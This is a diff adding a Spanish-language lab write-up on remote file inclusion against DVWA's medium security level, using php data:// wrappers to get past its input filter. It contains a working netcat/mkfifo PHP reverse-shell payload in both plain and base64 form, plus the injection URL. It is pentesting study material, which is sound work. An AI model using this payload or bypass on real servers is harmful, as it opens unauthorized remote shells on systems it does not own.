@@ -80,3 +80,51 @@ http || tcp.port == 80 || tcp.port == 443
 http.request.method == "POST"
 http.request.method == "GET"
 ```
+
+---------------------------------------------
+
+# RFI en DVWA Nivel Medio
+En el nivel medio vemos por el código que hace una validación de las entradas, impidiendo que se escriba http: ó https:
+```
+Medium File Inclusion Source
+<?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+// Input validation
+$file = str_replace( array( "http://", "https://" ), "", $file );
+$file = str_replace( array( "../", "..\\" ), "", $file );
+
+?>
+```
+
+Para poder ejecutar la shell reversa ahora funcionará:
+-  no podemos hacer una request "page=http://192.168.1.103/reverse.txt" ya que la convierte en "page=192.168.1.103/reverse.txt", lo que provoca que no funcione el RFI.
+- Haciendo bypass del tipo: %68%74%74%70%3A%2F%2F --> http://
+
+Para saltar esta restricción necesitaremos usar wrappers de php. Un ejemplo sencillo para ver cómo funciona la técnica es:
+```
+Código php --> <?php phpinfo(); ?>
+Codificación de ese código en Base64 --> PD9waHAgcGhwaW5mbygpOyA/Pg==
+Request que muestra la información php del servidor --> data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+Request que muestra la información php del servidor --> data:application/x-httpd-php;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+```
+
+Mi código para realizar varias acciones en el servidor que incluyen eliminar un archivo, crear un FIFO (named pipe), escuchar comandos a través de este pipe, y reenviar la salida a una conexión Netcat abierta, lo que me permite obtener una shell interactiva.:
+```
+<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1| nc 192.168.1.103 9000 > /tmp/f"); ?>
+```
+
+El código PHP codificado en Base64 es:
+```
+PD9waHAgcGFzc3RocnUoInJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8c2ggLWkgMj4mMXwgbmMgMTkyLjE2OC4xLjEwMyA5MDAwID4gL3RtcC9mIik7ID8+
+```
+
+Para usar este código en un ataque de RFI mediante el wrapper data://, insertaremos la cadena codificada en Base64 en la URL de la siguiente manera:
+```
+?data://text/plain;base64,PD9waHAgcGFzc3RocnUoInJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8c2ggLWkgMj4mMXwgbmMgMTkyLjE2OC4xLjEwMyA5MDAwID4gL3RtcC9mIik7ID8+
+```
+
+Sin embargo, al probarlo en DVWA no funciona, devuelve un error:
+![]()
